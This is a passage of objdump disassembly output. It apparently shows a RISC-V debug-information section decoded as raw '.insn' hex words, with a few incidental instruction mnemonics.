 138:	5820                	.insn	2, 0x5820
 13a:	0001                	.insn	2, 0x0001
 13c:	0200                	.insn	2, 0x0200
 13e:	5c91                	.insn	2, 0x5c91
 140:	6306                	.insn	2, 0x6306
 142:	1600                	.insn	2, 0x1600
 144:	6f2a                	.insn	2, 0x6f2a
 146:	0000                	.insn	2, 0x
 148:	0200                	.insn	2, 0x0200
 14a:	5891                	.insn	2, 0x5891
 14c:	6e06                	.insn	2, 0x6e06
 14e:	1600                	.insn	2, 0x1600
 150:	7d34                	.insn	2, 0x7d34
 152:	0000                	.insn	2, 0x
 154:	0200                	.insn	2, 0x0200
 156:	5491                	.insn	2, 0x5491
 158:	72747303          	.insn	4, 0x72747303
 15c:	1700                	.insn	2, 0x1700
 15e:	5a0e                	.insn	2, 0x5a0e
 160:	0001                	.insn	2, 0x0001
 162:	0200                	.insn	2, 0x0200
 164:	6891                	.insn	2, 0x6891
 166:	580a                	.insn	2, 0x580a
 168:	001a                	.insn	2, 0x001a
 16a:	3800                	.insn	2, 0x3800
 16c:	0000                	.insn	2, 0x
 16e:	0300                	.insn	2, 0x0300
 170:	0069                	.insn	2, 0x0069
 172:	1118                	.insn	2, 0x1118
 174:	007d                	.insn	2, 0x007d
 176:	0000                	.insn	2, 0x
 178:	9102                	.insn	2, 0x9102
 17a:	006c                	.insn	2, 0x006c
 17c:	0f00                	.insn	2, 0x0f00
 17e:	0704                	.insn	2, 0x0704
 180:	0042                	.insn	2, 0x0042
 182:	0000                	.insn	2, 0x
 184:	0109                	.insn	2, 0x0109
 186:	0001                	.insn	2, 0x0001
 188:	0c00                	.insn	2, 0x0c00
 18a:	0158                	.insn	2, 0x0158
 18c:	0000                	.insn	2, 0x
 18e:	19bc                	.insn	2, 0x19bc
 190:	0000                	.insn	2, 0x
 192:	007c                	.insn	2, 0x007c
 194:	0000                	.insn	2, 0x
 196:	9c01                	.insn	2, 0x9c01
 198:	01d2                	.insn	2, 0x01d2
 19a:	0000                	.insn	2, 0x
 19c:	c005                	.insn	2, 0xc005
 19e:	0000                	.insn	2, 0x
 1a0:	0c00                	.insn	2, 0x0c00
 1a2:	5820                	.insn	2, 0x5820
 1a4:	0001                	.insn	2, 0x0001
 1a6:	0200                	.insn	2, 0x0200
 1a8:	5c91                	.insn	2, 0x5c91
 1aa:	7a05                	.insn	2, 0x7a05
 1ac:	0000                	.insn	2, 0x
 1ae:	0c00                	.insn	2, 0x0c00
 1b0:	0001d233          	srl	tp,gp,zero
 1b4:	0200                	.insn	2, 0x0200
 1b6:	5891                	.insn	2, 0x5891
 1b8:	6e06                	.insn	2, 0x6e06
 1ba:	0c00                	.insn	2, 0x0c00
 1bc:	7d40                	.insn	2, 0x7d40
 1be:	0000                	.insn	2, 0x
 1c0:	0200                	.insn	2, 0x0200
 1c2:	5491                	.insn	2, 0x5491
 1c4:	b204                	.insn	2, 0xb204
 1c6:	0000                	.insn	2, 0x
 1c8:	0d00                	.insn	2, 0x0d00
 1ca:	5a0e                	.insn	2, 0x5a0e
 1cc:	0001                	.insn	2, 0x0001
 1ce:	0200                	.insn	2, 0x0200
 1d0:	6891                	.insn	2, 0x6891
 1d2:	63727303          	.insn	4, 0x63727303
 1d6:	0e00                	.insn	2, 0x0e00
 1d8:	d814                	.insn	2, 0xd814
 1da:	0001                	.insn	2, 0x0001
 1dc:	0200                	.insn	2, 0x0200
 1de:	6491                	.insn	2, 0x6491
 1e0:	e40a                	.insn	2, 0xe40a
 1e2:	0019                	.insn	2, 0x0019
 1e4:	4000                	.insn	2, 0x4000
 1e6:	0000                	.insn	2, 0x
 1e8:	0300                	.insn	2, 0x0300
 1ea:	0069                	.insn	2, 0x0069
 1ec:	1110                	.insn	2, 0x1110
 1ee:	007d                	.insn	2, 0x007d
 1f0:	0000                	.insn	2, 0x
 1f2:	9102                	.insn	2, 0x9102
 1f4:	006c                	.insn	2, 0x006c
 1f6:	0700                	.insn	2, 0x0700
 1f8:	000001d7          	.insn	4, 0x01d7
 1fc:	0710                	.insn	2, 0x0710
 1fe:	004e                	.insn	2, 0x004e
 200:	0000                	.insn	2, 0x
 202:	3200                	.insn	2, 0x3200
 204:	05000007          	.insn	4, 0x05000007
 208:	0100                	.insn	2, 0x0100
 20a:	0604                	.insn	2, 0x0604
 20c:	0001                	.insn	2, 0x0001
 20e:	1100                	.insn	2, 0x1100
 210:	029d                	.insn	2, 0x029d
 212:	0000                	.insn	2, 0x
 214:	f81d                	.insn	2, 0xf81d
 216:	0000                	.insn	2, 0x
 218:	0000                	.insn	2, 0x
 21a:	0000                	.insn	2, 0x
 21c:	2000                	.insn	2, 0x2000
 21e:	e000001b          	.insn	4, 0xe000001b
 222:	c800000f          	.insn	4, 0xc800000f
 226:	0004                	.insn	2, 0x0004
 228:	0500                	.insn	2, 0x0500
 22a:	0601                	.insn	2, 0x0601
 22c:	0081                	.insn	2, 0x0081
 22e:	0000                	.insn	2, 0x
 230:	0001f50b          	.insn	4, 0x0001f50b
 234:	0500                	.insn	2, 0x0500
 236:	0039182b          	.insn	4, 0x0039182b
 23a:	0000                	.insn	2, 0x
 23c:	0105                	.insn	2, 0x0105
 23e:	7f08                	.insn	2, 0x7f08
 240:	0000                	.insn	2, 0x
 242:	0500                	.insn	2, 0x0500
 244:	0502                	.insn	2, 0x0502
 246:	010d                	.insn	2, 0x010d
 248:	0000                	.insn	2, 0x
 24a:	0205                	.insn	2, 0x0205
 24c:	00008d07          	.insn	4, 0x8d07
 250:	0500                	.insn	2, 0x0500
 252:	0504                	.insn	2, 0x0504
 254:	00f8                	.insn	2, 0x00f8
 256:	0000                	.insn	2, 0x
 258:	00027b0b          	.insn	4, 0x00027b0b
 25c:	0500                	.insn	2, 0x0500
 25e:	0061194f          	fnmadd.s	fs2,ft2,ft6,ft0,rtz
 262:	0000                	.insn	2, 0x
 264:	0405                	.insn	2, 0x0405
 266:	0000d707          	.insn	4, 0xd707
 26a:	0500                	.insn	2, 0x0500
 26c:	0508                	.insn	2, 0x0508
 26e:	000000f3          	.insn	4, 0x00f3
 272:	0805                	.insn	2, 0x0805
 274:	0000d207          	.insn	4, 0xd207
 278:	1200                	.insn	2, 0x1200
 27a:	0504                	.insn	2, 0x0504
 27c:	6e69                	.insn	2, 0x6e69
 27e:	0074                	.insn	2, 0x0074
 280:	0000760f          	.insn	4, 0x760f
 284:	0500                	.insn	2, 0x0500
 286:	0704                	.insn	2, 0x0704
 288:	00dc                	.insn	2, 0x00dc
 28a:	0000                	.insn	2, 0x
 28c:	0000510b          	.insn	4, 0x510b
 290:	0600                	.insn	2, 0x0600
 292:	17d6                	.insn	2, 0x17d6
 294:	0082                	.insn	2, 0x0082
 296:	0000                	.insn	2, 0x
 298:	1005                	.insn	2, 0x1005
 29a:	e004                	.insn	2, 0xe004
 29c:	0001                	.insn	2, 0x0001
 29e:	1300                	.insn	2, 0x1300
 2a0:	0b04                	.insn	2, 0x0b04
 2a2:	000001f7          	.insn	4, 0x01f7
 2a6:	2d131807          	.insn	4, 0x2d131807
 2aa:	0000                	.insn	2, 0x
 2ac:	0b00                	.insn	2, 0x0b00
 2ae:	027d                	.insn	2, 0x027d
 2b0:	0000                	.insn	2, 0x
 2b2:	55143007          	.insn	4, 0x55143007
 2b6:	0000                	.insn	2, 0x
 2b8:	0800                	.insn	2, 0x0800
 2ba:	000000bb          	.insn	4, 0x00bb
 2be:	0105                	.insn	2, 0x0105
 2c0:	8808                	.insn	2, 0x8808
 2c2:	0000                	.insn	2, 0x
 2c4:	0f00                	.insn	2, 0x0f00
 2c6:	000000bb          	.insn	4, 0x00bb
 2ca:	bb14                	.insn	2, 0xbb14
 2cc:	0000                	.insn	2, 0x
 2ce:	0600                	.insn	2, 0x0600
 2d0:	009e                	.insn	2, 0x009e
 2d2:	0000                	.insn	2, 0x
 2d4:	00dd                	.insn	2, 0x00dd
 2d6:	0000                	.insn	2, 0x
 2d8:	8210                	.insn	2, 0x8210
 2da:	0000                	.insn	2, 0x
 2dc:	ff00                	.insn	2, 0xff00
 2de:	2302004f          	.insn	4, 0x2302004f
 2e2:	0002                	.insn	2, 0x0002
 2e4:	0200                	.insn	2, 0x0200
 2e6:	092d                	.insn	2, 0x092d
 2e8:	00cc                	.insn	2, 0x00cc
 2ea:	0000                	.insn	2, 0x
 2ec:	0305                	.insn	2, 0x0305
 2ee:	039c                	.insn	2, 0x039c
 2f0:	8000                	.insn	2, 0x8000
 2f2:	2302                	.insn	2, 0x2302
 2f4:	0004                	.insn	2, 0x0004
 2f6:	0200                	.insn	2, 0x0200
 2f8:	009e092f          	.insn	4, 0x009e092f
 2fc:	0000                	.insn	2, 0x
 2fe:	0305                	.insn	2, 0x0305
 300:	0388                	.insn	2, 0x0388
 302:	8000                	.insn	2, 0x8000
 304:	4102                	.insn	2, 0x4102
 306:	0004                	.insn	2, 0x0004
 308:	0400                	.insn	2, 0x0400
 30a:	01131053          	fadd.s	ft0,ft6,fa7,rtz
 30e:	0000                	.insn	2, 0x
 310:	0305                	.insn	2, 0x0305
 312:	038c                	.insn	2, 0x038c
 314:	8000                	.insn	2, 0x8000
 316:	c208                	.insn	2, 0xc208
 318:	0000                	.insn	2, 0x
 31a:	0600                	.insn	2, 0x0600
 31c:	009e                	.insn	2, 0x009e
 31e:	0000                	.insn	2, 0x
 320:	0128                	.insn	2, 0x0128
 322:	0000                	.insn	2, 0x
 324:	820a                	.insn	2, 0x820a
 326:	0000                	.insn	2, 0x
 328:	ff00                	.insn	2, 0xff00
 32a:	0200                	.insn	2, 0x0200
 32c:	0209                	.insn	2, 0x0209
 32e:	0000                	.insn	2, 0x
 330:	5504                	.insn	2, 0x5504
 332:	1809                	.insn	2, 0x1809
 334:	0001                	.insn	2, 0x0001
 336:	0500                	.insn	2, 0x0500
 338:	00539c03          	lh	s8,5(t2)
 33c:	0680                	.insn	2, 0x0680
 33e:	009e                	.insn	2, 0x009e
 340:	0000                	.insn	2, 0x
 342:	0000014b          	fnmsub.s	ft2,ft0,ft0,ft0,rne
 346:	8210                	.insn	2, 0x8210
 348:	0000                	.insn	2, 0x
 34a:	ff00                	.insn	2, 0xff00
 34c:	81020007          	.insn	4, 0x81020007
 350:	0004                	.insn	2, 0x0004
 352:	0400                	.insn	2, 0x0400
 354:	0956                	.insn	2, 0x0956
 356:	013a                	.insn	2, 0x013a
 358:	0000                	.insn	2, 0x
 35a:	0305                	.insn	2, 0x0305
 35c:	549c                	.insn	2, 0x549c
 35e:	8000                	.insn	2, 0x8000
 360:	1902                	.insn	2, 0x1902
 362:	0002                	.insn	2, 0x0002
 364:	0300                	.insn	2, 0x0300
 366:	0905                	.insn	2, 0x0905
 368:	009e                	.insn	2, 0x009e
 36a:	0000                	.insn	2, 0x
 36c:	0305                	.insn	2, 0x0305
 36e:	0390                	.insn	2, 0x0390
 370:	8000                	.insn	2, 0x8000
 372:	8c02                	.insn	2, 0x8c02
 374:	0004                	.insn	2, 0x0004
 376:	0300                	.insn	2, 0x0300
 378:	009e0907          	.insn	4, 0x009e0907
 37c:	0000                	.insn	2, 0x
 37e:	0305                	.insn	2, 0x0305
 380:	0391                	.insn	2, 0x0391
 382:	8000                	.insn	2, 0x8000
 384:	aa06                	.insn	2, 0xaa06
 386:	0000                	.insn	2, 0x
 388:	9100                	.insn	2, 0x9100
 38a:	0001                	.insn	2, 0x0001
 38c:	0a00                	.insn	2, 0x0a00
 38e:	0082                	.insn	2, 0x0082
 390:	0000                	.insn	2, 0x
 392:	00ff 9f02 0003 0300 	.insn	10, 0x0a08030000039f0200ff
 39a:	0a08 
 39c:	0181                	.insn	2, 0x0181
 39e:	0000                	.insn	2, 0x
 3a0:	0305                	.insn	2, 0x0305
 3a2:	5c9c                	.insn	2, 0x5c9c
 3a4:	8000                	.insn	2, 0x8000
 3a6:	2c02                	.insn	2, 0x2c02
 3a8:	0002                	.insn	2, 0x0002
 3aa:	0300                	.insn	2, 0x0300
 3ac:	0a09                	.insn	2, 0x0a09
 3ae:	00aa                	.insn	2, 0x00aa
 3b0:	0000                	.insn	2, 0x
 3b2:	0305                	.insn	2, 0x0305
 3b4:	0394                	.insn	2, 0x0394
 3b6:	8000                	.insn	2, 0x8000
 3b8:	6802                	.insn	2, 0x6802
 3ba:	0002                	.insn	2, 0x0002
 3bc:	0300                	.insn	2, 0x0300
 3be:	0a0a                	.insn	2, 0x0a0a
 3c0:	00aa                	.insn	2, 0x00aa
 3c2:	0000                	.insn	2, 0x
 3c4:	0305                	.insn	2, 0x0305
 3c6:	0398                	.insn	2, 0x0398
 3c8:	8000                	.insn	2, 0x8000
 3ca:	d706                	.insn	2, 0xd706
 3cc:	0001                	.insn	2, 0x0001
 3ce:	d700                	.insn	2, 0xd700
 3d0:	0001                	.insn	2, 0x0001
 3d2:	0a00                	.insn	2, 0x0a00
 3d4:	0082                	.insn	2, 0x0082
 3d6:	0000                	.insn	2, 0x
 3d8:	0004                	.insn	2, 0x0004
 3da:	dc08                	.insn	2, 0xdc08
 3dc:	0001                	.insn	2, 0x0001
 3de:	1500                	.insn	2, 0x1500
 3e0:	000001e7          	jalr	gp,zero # 0 <_start-0x1000>
 3e4:	aa16                	.insn	2, 0xaa16
 3e6:	0000                	.insn	2, 0x
 3e8:	0000                	.insn	2, 0x
 3ea:	5d02                	.insn	2, 0x5d02
 3ec:	0002                	.insn	2, 0x0002
 3ee:	0300                	.insn	2, 0x0300
 3f0:	08a8                	.insn	2, 0x08a8
 3f2:	000001c7          	fmsub.s	ft3,ft0,ft0,ft0,rne
 3f6:	0305                	.insn	2, 0x0305
 3f8:	0374                	.insn	2, 0x0374
 3fa:	8000                	.insn	2, 0x8000
 3fc:	3902                	.insn	2, 0x3902
 3fe:	0004                	.insn	2, 0x0004
 400:	0400                	.insn	2, 0x0400
 402:	0a5a                	.insn	2, 0x0a5a
 404:	00aa                	.insn	2, 0x00aa
 406:	0000                	.insn	2, 0x
 408:	0305                	.insn	2, 0x0305
 40a:	649c                	.insn	2, 0x649c
 40c:	8000                	.insn	2, 0x8000
 40e:	8c02                	.insn	2, 0x8c02
 410:	0002                	.insn	2, 0x0002
 412:	0400                	.insn	2, 0x0400
 414:	00aa0a5b          	.insn	4, 0x00aa0a5b
 418:	0000                	.insn	2, 0x
 41a:	0305                	.insn	2, 0x0305
 41c:	64a0                	.insn	2, 0x64a0
 41e:	8000                	.insn	2, 0x8000
 420:	9701                	.insn	2, 0x9701
 422:	0004                	.insn	2, 0x0004
 424:	0400                	.insn	2, 0x0400
 426:	1160                	.insn	2, 0x1160
 428:	0181                	.insn	2, 0x0181
 42a:	0000                	.insn	2, 0x
 42c:	0305                	.insn	2, 0x0305
 42e:	609c                	.insn	2, 0x609c
 430:	8000                	.insn	2, 0x8000
 432:	9e06                	.insn	2, 0x9e06
 434:	0000                	.insn	2, 0x
 436:	3f00                	.insn	2, 0x3f00
 438:	0002                	.insn	2, 0x0002
 43a:	0a00                	.insn	2, 0x0a00
 43c:	0082                	.insn	2, 0x0082
 43e:	0000                	.insn	2, 0x
 440:	0001                	.insn	2, 0x0001
 442:	4502                	.insn	2, 0x4502
 444:	0002                	.insn	2, 0x0002
 446:	0400                	.insn	2, 0x0400
 448:	0961                	.insn	2, 0x0961
 44a:	0000022f          	.insn	4, 0x022f
 44e:	0305                	.insn	2, 0x0305
 450:	64a4                	.insn	2, 0x64a4
 452:	8000                	.insn	2, 0x8000
 454:	aa06                	.insn	2, 0xaa06
 456:	0000                	.insn	2, 0x
 458:	6100                	.insn	2, 0x6100
 45a:	0002                	.insn	2, 0x0002
 45c:	0a00                	.insn	2, 0x0a00
 45e:	0082                	.insn	2, 0x0082
 460:	0000                	.insn	2, 0x
 462:	0001                	.insn	2, 0x0001
 464:	ef02                	.insn	2, 0xef02
 466:	04000003          	lb	zero,64(zero) # 40 <_start-0xfc0>
 46a:	0a62                	.insn	2, 0x0a62
 46c:	0251                	.insn	2, 0x0251
 46e:	0000                	.insn	2, 0x
 470:	0305                	.insn	2, 0x0305
 472:	64a8                	.insn	2, 0x64a8
 474:	8000                	.insn	2, 0x8000
 476:	00049f17          	auipc	t5,0x49
 47a:	0400                	.insn	2, 0x0400
 47c:	26fc068b          	.insn	4, 0x26fc068b
 480:	0000                	.insn	2, 0x
 482:	0404                	.insn	2, 0x0404
 484:	0000                	.insn	2, 0x
 486:	9c01                	.insn	2, 0x9c01
 488:	032d                	.insn	2, 0x032d
 48a:	0000                	.insn	2, 0x
 48c:	0901                	.insn	2, 0x0901
 48e:	0004                	.insn	2, 0x0004
 490:	0400                	.insn	2, 0x0400
 492:	088d                	.insn	2, 0x088d
 494:	00b6                	.insn	2, 0x00b6
 496:	0000                	.insn	2, 0x
 498:	9102                	.insn	2, 0x9102
 49a:	0154                	.insn	2, 0x0154
 49c:	00000253          	fadd.s	ft4,ft0,ft0,rne
 4a0:	8f04                	.insn	2, 0x8f04
 4a2:	0000aa0b          	.insn	4, 0xaa0b
 4a6:	0200                	.insn	2, 0x0200
 4a8:	6c91                	.insn	2, 0x6c91
 4aa:	2c0c                	.insn	2, 0x2c0c
 4ac:	38000027          	.insn	4, 0x38000027
 4b0:	0000                	.insn	2, 0x
 4b2:	c200                	.insn	2, 0xc200
 4b4:	0002                	.insn	2, 0x0002
 4b6:	0300                	.insn	2, 0x0300
 4b8:	0069                	.insn	2, 0x0069
 4ba:	9104                	.insn	2, 0x9104
 4bc:	760e                	.insn	2, 0x760e
 4be:	0000                	.insn	2, 0x
 4c0:	0200                	.insn	2, 0x0200
 4c2:	6891                	.insn	2, 0x6891
 4c4:	0c00                	.insn	2, 0x0c00
 4c6:	2764                	.insn	2, 0x2764
 4c8:	0000                	.insn	2, 0x
 4ca:	0038                	.insn	2, 0x0038
 4cc:	0000                	.insn	2, 0x
 4ce:	02dd                	.insn	2, 0x02dd
 4d0:	0000                	.insn	2, 0x
 4d2:	04006903          	.insn	4, 0x04006903
 4d6:	0b96                	.insn	2, 0x0b96
 4d8:	0076                	.insn	2, 0x0076
 4da:	0000                	.insn	2, 0x
 4dc:	9102                	.insn	2, 0x9102
 4de:	0064                	.insn	2, 0x0064
 4e0:	00285c07          	.insn	4, 0x00285c07
 4e4:	f000                	.insn	2, 0xf000
 4e6:	0001                	.insn	2, 0x0001
 4e8:	0300                	.insn	2, 0x0300
 4ea:	656c                	.insn	2, 0x656c
 4ec:	006e                	.insn	2, 0x006e
 4ee:	a704                	.insn	2, 0xa704
 4f0:	0000aa0f          	.insn	4, 0xaa0f
 4f4:	0200                	.insn	2, 0x0200
 4f6:	6091                	.insn	2, 0x6091
 4f8:	640c                	.insn	2, 0x640c
 4fa:	0028                	.insn	2, 0x0028
 4fc:	3800                	.insn	2, 0x3800
 4fe:	0000                	.insn	2, 0x
 500:	1200                	.insn	2, 0x1200
 502:	01000003          	lb	zero,16(zero) # 10 <_start-0xff0>
 506:	044c                	.insn	2, 0x044c
 508:	0000                	.insn	2, 0x
 50a:	aa04                	.insn	2, 0xaa04
 50c:	aa10                	.insn	2, 0xaa10
 50e:	0000                	.insn	2, 0x
 510:	0200                	.insn	2, 0x0200
 512:	5c91                	.insn	2, 0x5c91
 514:	0700                	.insn	2, 0x0700
 516:	289c                	.insn	2, 0x289c
 518:	0000                	.insn	2, 0x
 51a:	0074                	.insn	2, 0x0074
 51c:	0000                	.insn	2, 0x
 51e:	ec01                	.insn	2, 0xec01
 520:	0001                	.insn	2, 0x0001
 522:	0400                	.insn	2, 0x0400
 524:	00aa10af          	.insn	4, 0x00aa10af
 528:	0000                	.insn	2, 0x
 52a:	9102                	.insn	2, 0x9102
 52c:	0058                	.insn	2, 0x0058
 52e:	0000                	.insn	2, 0x
 530:	5109                	.insn	2, 0x5109
 532:	0004                	.insn	2, 0x0004
 534:	0400                	.insn	2, 0x0400
 536:	5468                	.insn	2, 0x5468
 538:	0025                	.insn	2, 0x0025
 53a:	a800                	.insn	2, 0xa800
 53c:	0001                	.insn	2, 0x0001
 53e:	0100                	.insn	2, 0x0100
 540:	e59c                	.insn	2, 0xe59c
 542:	04000003          	lb	zero,64(zero) # 40 <_start-0xfc0>
 546:	024c                	.insn	2, 0x024c
 548:	0000                	.insn	2, 0x
 54a:	6804                	.insn	2, 0x6804
 54c:	0003e51b          	.insn	4, 0x0003e51b
 550:	0200                	.insn	2, 0x0200
 552:	5c91                	.insn	2, 0x5c91
 554:	5d04                	.insn	2, 0x5d04
 556:	0004                	.insn	2, 0x0004
 558:	0400                	.insn	2, 0x0400
 55a:	2d68                	.insn	2, 0x2d68
 55c:	03ea                	.insn	2, 0x03ea
 55e:	0000                	.insn	2, 0x
 560:	9102                	.insn	2, 0x9102
 562:	0158                	.insn	2, 0x0158
 564:	011e                	.insn	2, 0x011e
 566:	0000                	.insn	2, 0x
 568:	6a04                	.insn	2, 0x6a04
 56a:	aa14                	.insn	2, 0xaa14
 56c:	0000                	.insn	2, 0x
 56e:	0100                	.insn	2, 0x0100
 570:	0159                	.insn	2, 0x0159
 572:	0214                	.insn	2, 0x0214
 574:	0000                	.insn	2, 0x
 576:	6a04                	.insn	2, 0x6a04
 578:	0000aa1b          	.insn	4, 0xaa1b
 57c:	0100                	.insn	2, 0x0100
 57e:	0c59                	.insn	2, 0x0c59
 580:	256c                	.insn	2, 0x256c
 582:	0000                	.insn	2, 0x
 584:	00d0                	.insn	2, 0x00d0
 586:	0000                	.insn	2, 0x
 588:	03cd                	.insn	2, 0x03cd
 58a:	0000                	.insn	2, 0x
 58c:	04006903          	.insn	4, 0x04006903
 590:	0b6d                	.insn	2, 0x0b6d
 592:	0076                	.insn	2, 0x0076
 594:	0000                	.insn	2, 0x
 596:	9102                	.insn	2, 0x9102
 598:	0c6c                	.insn	2, 0x0c6c
 59a:	2594                	.insn	2, 0x2594
 59c:	0000                	.insn	2, 0x
 59e:	000c                	.insn	2, 0x000c
 5a0:	0000                	.insn	2, 0x
 5a2:	000003b3          	add	t2,zero,zero
 5a6:	8601                	.insn	2, 0x8601
 5a8:	0002                	.insn	2, 0x0002
 5aa:	0400                	.insn	2, 0x0400
 5ac:	00610b6f          	jal	s6,105b2 <__rodata_end+0xdaac>
 5b0:	0000                	.insn	2, 0x
 5b2:	9102                	.insn	2, 0x9102
 5b4:	0064                	.insn	2, 0x0064
 5b6:	0025d807          	.insn	4, 0x0025d807
 5ba:	0c00                	.insn	2, 0x0c00
 5bc:	0000                	.insn	2, 0x
 5be:	0100                	.insn	2, 0x0100
 5c0:	0286                	.insn	2, 0x0286
 5c2:	0000                	.insn	2, 0x
 5c4:	7204                	.insn	2, 0x7204
 5c6:	0000610b          	.insn	4, 0x610b
 5ca:	0200                	.insn	2, 0x0200
 5cc:	6091                	.insn	2, 0x6091
 5ce:	0000                	.insn	2, 0x
 5d0:	00267007          	.insn	4, 0x00267007
 5d4:	7400                	.insn	2, 0x7400
 5d6:	0000                	.insn	2, 0x
 5d8:	0300                	.insn	2, 0x0300
 5da:	0069                	.insn	2, 0x0069
 5dc:	8104                	.insn	2, 0x8104
 5de:	aa10                	.insn	2, 0xaa10
 5e0:	0000                	.insn	2, 0x
 5e2:	0200                	.insn	2, 0x0200
 5e4:	6891                	.insn	2, 0x6891
 5e6:	0000                	.insn	2, 0x
 5e8:	9e08                	.insn	2, 0x9e08
 5ea:	0000                	.insn	2, 0x
 5ec:	0800                	.insn	2, 0x0800
 5ee:	00aa                	.insn	2, 0x00aa
 5f0:	0000                	.insn	2, 0x
 5f2:	e109                	.insn	2, 0xe109
 5f4:	03000003          	lb	zero,48(zero) # 30 <_start-0xfd0>
 5f8:	788a                	.insn	2, 0x788a
 5fa:	0024                	.insn	2, 0x0024
 5fc:	dc00                	.insn	2, 0xdc00
 5fe:	0000                	.insn	2, 0x
 600:	0100                	.insn	2, 0x0100
 602:	149c                	.insn	2, 0x149c
 604:	0004                	.insn	2, 0x0004
 606:	0400                	.insn	2, 0x0400
 608:	0395                	.insn	2, 0x0395
 60a:	0000                	.insn	2, 0x
 60c:	aa1d8a03          	lb	s4,-1375(s11)
 610:	0000                	.insn	2, 0x
 612:	0200                	.insn	2, 0x0200
 614:	6c91                	.insn	2, 0x6c91
 616:	0900                	.insn	2, 0x0900
 618:	000003d3          	fadd.s	ft7,ft0,ft0,rne
 61c:	239c7003          	.insn	4, 0x239c7003
 620:	0000                	.insn	2, 0x
 622:	00dc                	.insn	2, 0x00dc
 624:	0000                	.insn	2, 0x
 626:	9c01                	.insn	2, 0x9c01
 628:	0439                	.insn	2, 0x0439
 62a:	0000                	.insn	2, 0x
 62c:	9504                	.insn	2, 0x9504
 62e:	03000003          	lb	zero,48(zero) # 30 <_start-0xfd0>
 632:	1d70                	.insn	2, 0x1d70
 634:	00aa                	.insn	2, 0x00aa
 636:	0000                	.insn	2, 0x
 638:	9102                	.insn	2, 0x9102
 63a:	006c                	.insn	2, 0x006c
 63c:	c509                	.insn	2, 0xc509
 63e:	03000003          	lb	zero,48(zero) # 30 <_start-0xfd0>
 642:	c056                	.insn	2, 0xc056
 644:	0022                	.insn	2, 0x0022
 646:	dc00                	.insn	2, 0xdc00
 648:	0000                	.insn	2, 0x
 64a:	0100                	.insn	2, 0x0100
 64c:	5e9c                	.insn	2, 0x5e9c
 64e:	0004                	.insn	2, 0x0004
 650:	0400                	.insn	2, 0x0400
 652:	0395                	.insn	2, 0x0395
 654:	0000                	.insn	2, 0x
 656:	aa1d5603          	lhu	a2,-1375(s10)
 65a:	0000                	.insn	2, 0x
 65c:	0200                	.insn	2, 0x0200
 65e:	6c91                	.insn	2, 0x6c91
 660:	0900                	.insn	2, 0x0900
 662:	000003b7          	lui	t2,0x0
 666:	21e43c03          	.insn	4, 0x21e43c03
 66a:	0000                	.insn	2, 0x
 66c:	00dc                	.insn	2, 0x00dc
 66e:	0000                	.insn	2, 0x
 670:	9c01                	.insn	2, 0x9c01
 672:	00000483          	lb	s1,0(zero) # 0 <_start-0x1000>
 676:	9504                	.insn	2, 0x9504
 678:	03000003          	lb	zero,48(zero) # 30 <_start-0xfd0>
 67c:	1d3c                	.insn	2, 0x1d3c
 67e:	00aa                	.insn	2, 0x00aa
 680:	0000                	.insn	2, 0x
 682:	9102                	.insn	2, 0x9102
 684:	006c                	.insn	2, 0x006c
 686:	a909                	.insn	2, 0xa909
 688:	03000003          	lb	zero,48(zero) # 30 <_start-0xfd0>
 68c:	0822                	.insn	2, 0x0822
 68e:	0021                	.insn	2, 0x0021
 690:	dc00                	.insn	2, 0xdc00
 692:	0000                	.insn	2, 0x
 694:	0100                	.insn	2, 0x0100
 696:	a89c                	.insn	2, 0xa89c
 698:	0004                	.insn	2, 0x0004
 69a:	0400                	.insn	2, 0x0400
 69c:	0395                	.insn	2, 0x0395
 69e:	0000                	.insn	2, 0x
 6a0:	aa1d2203          	lw	tp,-1375(s10)
 6a4:	0000                	.insn	2, 0x
 6a6:	0200                	.insn	2, 0x0200
 6a8:	6c91                	.insn	2, 0x6c91
 6aa:	0900                	.insn	2, 0x0900
 6ac:	0466                	.insn	2, 0x0466
 6ae:	0000                	.insn	2, 0x
 6b0:	202c0c03          	lb	s8,514(s8)
 6b4:	0000                	.insn	2, 0x
 6b6:	00dc                	.insn	2, 0x00dc
 6b8:	0000                	.insn	2, 0x
 6ba:	9c01                	.insn	2, 0x9c01
 6bc:	04cd                	.insn	2, 0x04cd
 6be:	0000                	.insn	2, 0x
 6c0:	9504                	.insn	2, 0x9504
 6c2:	03000003          	lb	zero,48(zero) # 30 <_start-0xfd0>
 6c6:	1e0c                	.insn	2, 0x1e0c
 6c8:	00aa                	.insn	2, 0x00aa
 6ca:	0000                	.insn	2, 0x
 6cc:	9102                	.insn	2, 0x9102
 6ce:	006c                	.insn	2, 0x006c
 6d0:	fe09                	.insn	2, 0xfe09
 6d2:	02000003          	lb	zero,32(zero) # 20 <_start-0xfe0>
 6d6:	001f2c37          	lui	s8,0x1f2
 6da:	0000                	.insn	2, 0x
 6dc:	0001                	.insn	2, 0x0001
 6de:	0100                	.insn	2, 0x0100
 6e0:	7f9c                	.insn	2, 0x7f9c
 6e2:	0005                	.insn	2, 0x0005
 6e4:	0400                	.insn	2, 0x0400
 6e6:	037e                	.insn	2, 0x037e
 6e8:	0000                	.insn	2, 0x
 6ea:	3702                	.insn	2, 0x3702
 6ec:	aa1a                	.insn	2, 0xaa1a
 6ee:	0000                	.insn	2, 0x
 6f0:	0200                	.insn	2, 0x0200
 6f2:	4c91                	.insn	2, 0x4c91
 6f4:	6604                	.insn	2, 0x6604
 6f6:	02000003          	lb	zero,32(zero) # 20 <_start-0xfe0>
 6fa:	00aa2c37          	lui	s8,0xaa2
 6fe:	0000                	.insn	2, 0x
 700:	9102                	.insn	2, 0x9102
 702:	0148                	.insn	2, 0x0148
 704:	0416                	.insn	2, 0x0416
 706:	0000                	.insn	2, 0x
 708:	3a02                	.insn	2, 0x3a02
 70a:	aa0e                	.insn	2, 0xaa0e
 70c:	0000                	.insn	2, 0x
 70e:	0200                	.insn	2, 0x0200
 710:	6c91                	.insn	2, 0x6c91
 712:	9201                	.insn	2, 0x9201
 714:	0002                	.insn	2, 0x0002
 716:	0200                	.insn	2, 0x0200
 718:	0e48                	.insn	2, 0x0e48
 71a:	00aa                	.insn	2, 0x00aa
 71c:	0000                	.insn	2, 0x
 71e:	9102                	.insn	2, 0x9102
 720:	0760                	.insn	2, 0x0760
 722:	1f90                	.insn	2, 0x1f90
 724:	0000                	.insn	2, 0x
 726:	0088                	.insn	2, 0x0088
 728:	0000                	.insn	2, 0x
 72a:	02006903          	.insn	4, 0x02006903
 72e:	00aa134b          	fnmsub.s	ft6,fs4,fa0,ft0,rtz
 732:	0000                	.insn	2, 0x
 734:	9102                	.insn	2, 0x9102
 736:	0768                	.insn	2, 0x0768
